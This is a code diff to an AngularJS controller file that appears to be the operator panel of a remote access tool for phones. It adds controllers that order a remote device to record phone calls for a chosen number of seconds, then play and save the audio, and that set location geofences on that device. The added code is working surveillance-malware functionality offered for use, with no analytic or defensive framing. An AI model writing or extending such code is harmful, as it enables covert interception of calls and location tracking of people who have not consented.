@@ -57,7 +57,118 @@ app.config(function ($routeProvider) {
         .when("/screenCapture", {
             templateUrl: "./views/screenCapture.html",
             controller: "ScrCtrl"
-        });
+        })
+        .when("/callRecording", {
+            templateUrl: "./views/callRecording.html",
+            controller: "CallRecCtrl"
+        })
+        .when("/geofencing", {
+            templateUrl: "./views/geofencing.html",
+            controller: "GeoCtrl"
+    });
+});
+
+
+//-----------------------Call Recording Controller (callRecording.htm)------------------------
+app.controller("CallRecCtrl", function ($scope, $rootScope) {
+    $CallRecCtrl = $scope;
+    var callRecording = CONSTANTS.orders.callRecording;
+
+    $CallRecCtrl.$on('$destroy', () => {
+        socket.removeAllListeners(callRecording);
+    });
+
+    $CallRecCtrl.isAudio = false;
+
+    $CallRecCtrl.Record = (seconds) => {
+        if (seconds) {
+            if (seconds > 0) {
+                $CallRecCtrl.load = 'loading';
+                $rootScope.Log('Recording call ' + seconds + "'s...");
+                socket.emit(ORDER, { order: callRecording, sec: seconds });
+            } else
+                $rootScope.Log('Seconds must be more than 0');
+        }
+    }
+
+    socket.on(callRecording, (data) => {
+        if (data.file == true) {
+            $CallRecCtrl.load = '';
+            $rootScope.Log('Call recording arrived', CONSTANTS.logStatus.SUCCESS);
+
+            var player = document.getElementById('player');
+            var sourceMp3 = document.getElementById('sourceMp3');
+            var uint8Arr = new Uint8Array(data.buffer);
+            var binary = '';
+            for (var i = 0; i < uint8Arr.length; i++) {
+                binary += String.fromCharCode(uint8Arr[i]);
+            }
+            var base64String = window.btoa(binary);
+
+            $CallRecCtrl.isAudio = true;
+            $CallRecCtrl.$apply();
+            sourceMp3.src = "data:audio/mp4;base64," + base64String;
+            player.load();
+            player.play();
+
+            $CallRecCtrl.SaveAudio = () => {
+                $rootScope.Log('Saving file..');
+                var filePath = path.join(downloadsPath, data.name);
+                fs.outputFile(filePath, data.buffer, (err) => {
+                    if (err)
+                        $rootScope.Log('Saving file failed', CONSTANTS.logStatus.FAIL);
+                    else
+                        $rootScope.Log('File saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);
+                });
+            };
+        } else if (data.error) {
+            $CallRecCtrl.load = '';
+            $rootScope.Log('Call recording failed', CONSTANTS.logStatus.FAIL);
+            $CallRecCtrl.$apply();
+        }
+    });
+});
+
+
+//-----------------------Geofencing Controller (geofencing.htm)------------------------
+app.controller("GeoCtrl", function ($scope, $rootScope) {
+    $GeoCtrl = $scope;
+    var geofencing = CONSTANTS.orders.geofencing;
+
+    $GeoCtrl.$on('$destroy', () => {
+        socket.removeAllListeners(geofencing);
+    });
+
+    $GeoCtrl.result = null;
+
+    $GeoCtrl.AddGeofence = () => {
+        var lat = parseFloat($GeoCtrl.geoLat);
+        var lng = parseFloat($GeoCtrl.geoLng);
+        var radius = parseFloat($GeoCtrl.geoRadius || 1000);
+        var expiration = parseInt($GeoCtrl.geoExpiration || 24);
+
+        if (isNaN(lat) || isNaN(lng)) {
+            $rootScope.Log('Enter valid lat/lng', CONSTANTS.logStatus.FAIL);
+            return;
+        }
+
+        $GeoCtrl.load = 'loading';
+        $rootScope.Log('Adding geofence at ' + lat + ',' + lng + '...');
+        socket.emit(ORDER, { order: geofencing, lat: lat, lng: lng, radius: radius, expiration: expiration });
+    }
+
+    socket.on(geofencing, (data) => {
+        $GeoCtrl.load = '';
+        if (data.done) {
+            $rootScope.Log('Geofence added', CONSTANTS.logStatus.SUCCESS);
+            $GeoCtrl.result = { success: true, msg: 'Geofence active at ' + data.lat + ',' + data.lng + ' radius ' + data.radius + 'm' };
+            $GeoCtrl.$apply();
+        } else if (data.error) {
+            $rootScope.Log('Geofence failed: ' + data.error, CONSTANTS.logStatus.FAIL);
+            $GeoCtrl.result = { success: false, msg: 'Error: ' + data.error };
+            $GeoCtrl.$apply();
+        }
+    });
 });
 
 
